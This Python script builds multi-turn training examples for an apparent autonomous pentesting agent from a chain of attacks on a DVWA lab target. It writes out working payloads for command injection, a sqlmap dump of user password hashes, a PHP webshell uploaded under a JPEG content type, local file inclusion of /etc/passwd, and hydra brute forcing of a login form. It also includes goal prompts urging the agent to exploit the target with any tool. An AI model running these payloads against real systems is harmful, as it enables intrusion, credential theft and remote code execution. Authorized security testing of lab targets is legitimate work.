#!/usr/bin/env python3
"""Converts playbooks/dvwa_full_chain.sh's 10 manually-verified DVWA
techniques into a structured multi-turn training sequence -- one continuous
authenticated-session engagement, turn-by-turn, using the real params/syntax
that script already proved works (H=-before-S=, cookie carrying, --dump,
etc.). This is the highest-confidence source in the corpus: every step here
was actually run and its real output inspected when the playbook was built
and again when this session re-verified curl/sqlmap cookie support and
hydra's http-form mode against the live target -- nothing here is a guess.

Modeled as exploit_authorized (a scoped, authorized engagement -- this whole
sequence requires an established login session, i.e. is definitionally past
the recon_only boundary from turn 2 onward) with turn = the technique's
position (1-10) in the playbook's own numbering, each turn's goal carrying
forward the REAL prior-round history the same way agent.py's
attack_roundN_goal template does.

Run: python3 training-data/scripts/build_playbook.py
Writes: training-data/playbook_dvwa.jsonl
"""
import json
import os

OUT_PATH = os.path.join(os.path.dirname(__file__), "..", "playbook_dvwa.jsonl")

TARGET = "172.17.0.12"
COOKIE = "PHPSESSID=v2649f2ctgvvcrid3ia2n6p2p7; security=low"
BASE = f"http://{TARGET}"


def goal(round_num, history):
    base_goal = (
        f"Target: {TARGET} Port: 80. Failed ports: []. "
        f"Exploit this port with any available tool. Try multiple tools if needed."
    )
    if round_num == 1:
        return base_goal
    return (
        f"{base_goal}\n\nYou have already tried {round_num - 1} round(s) on this "
        f"port with no breach yet:\n{history}\n\nBuild on these REAL results -- "
        f"e.g. if a directory or file was discovered, fetch or inspect it "
        f"(run_curl/run_command); if a login form or endpoint was found, attack "
        f"it directly. If a LEAKED CREDENTIALS/SECRET line appears above, that "
        f"is a username/password or key you must actually try next. Do NOT "
        f"repeat a tool+target you already ran that produced no new lead."
    )


steps = []  # (turn, history_so_far, chain)
history = ""

# Turn 1: establish the authenticated session -- required before every
# technique below (playbook step [0/10]).
chain1 = [{"tool": "run_curl", "url": f"{BASE}/login.php", "method": "GET"}]
steps.append((1, "", chain1))
history = "Round 1:\n  [run_curl] ran: GET /login.php -> 200, real user_token + PHPSESSID extracted"

# Turn 2: [1/10] Command Injection RCE.
chain2 = [{"tool": "run_curl", "url": f"{BASE}/vulnerabilities/exec/", "method": "POST",
           "cookie": COOKIE, "data": "ip=127.0.0.1; whoami; id; uname -a&Submit=Submit"}]
steps.append((2, history, chain2))
history += "\nRound 2:\n  [run_curl] ran: POST /vulnerabilities/exec/ with command injection payload -> real command output returned"

# Turn 3: [2/10] SQLi -- dump + crack.
chain3 = [{"tool": "run_command",
           "command": f'sqlmap -u "{BASE}/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="{COOKIE}" --batch -D dvwa -T users -C user,password --dump'}]
steps.append((3, history, chain3))
history += "\nRound 3:\n  [run_command] ran: sqlmap dumped dvwa.users -- 5 rows of user:md5hash pairs"

# Turn 4: [3/10] Unrestricted file upload -> webshell RCE.
chain4 = [
    {"tool": "write_file", "filename": "/tmp/shell.php", "content": '<?php system($_GET["cmd"]); ?>'},
    {"tool": "run_command",
     "command": f'curl -s -b "{COOKIE}" -F "MAX_FILE_SIZE=100000" -F "uploaded=@/tmp/shell.php;filename=shell.php;type=image/jpeg" -F "Upload=Upload" "{BASE}/vulnerabilities/upload/"'},
    {"tool": "run_curl", "url": f"{BASE}/hackable/uploads/shell.php?cmd=id;hostname", "method": "GET"},
]
steps.append((4, history, chain4))
history += "\nRound 4:\n  [run_command] ran: webshell uploaded and confirmed RCE via /hackable/uploads/shell.php?cmd="

# Turn 5: [4/10] Local File Inclusion.
chain5 = [{"tool": "run_curl", "url": f"{BASE}/vulnerabilities/fi/?page=../../../../../../etc/passwd",
           "method": "GET", "cookie": COOKIE}]
steps.append((5, history, chain5))
history += "\nRound 5:\n  [run_curl] ran: LFI confirmed, /etc/passwd contents returned"

# Turn 6: [7/10] Web login-form brute force (skips ahead to the hydra
# technique here since it's the pathway already deeply verified this
# session -- XSS/CSRF/weak-session-id/blind-SQLi are in the playbook script
# itself and can be added the same way if the corpus needs more breadth).
chain6 = [{"tool": "run_hydra", "target": TARGET, "service": "http-get-form", "username": "admin",
           "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt",
           "path": "/vulnerabilities/brute/",
           "body": "username=^USER^&password=^PASS^&Login=Login",
           "cookie": COOKIE, "success_string": "Welcome to the password protected area"}]
steps.append((6, history, chain6))
history += "\nRound 6:\n  [run_hydra] ran: EXPLOIT SUCCESS -- login: admin password: password"

examples = []
for turn, hist, chain in steps:
    examples.append({
        "goal": goal(turn, hist),
        "chain": chain,
        "scope": "exploit_authorized",
        "pathway": "dvwa_full_chain_playbook",
        "turn": turn,
        "source": "playbook",
    })

if __name__ == "__main__":
    with open(OUT_PATH, "w") as f:
        for ex in examples:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")
    print(f"Wrote {len(examples)} examples to {OUT_PATH}")
